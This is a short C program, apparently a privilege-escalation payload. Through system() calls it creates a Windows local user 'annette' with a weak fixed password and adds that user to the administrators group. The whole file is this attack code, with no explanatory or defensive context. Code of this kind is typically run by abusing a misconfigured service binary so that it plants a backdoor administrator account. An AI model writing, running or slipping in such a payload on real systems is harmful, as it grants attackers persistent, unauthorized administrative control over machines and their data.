#include <stdlib.h>

int main ()
{
  system ("net user annette Password123 /add");
  system ("net localgroup administrators annette /add");
  return 0;
}
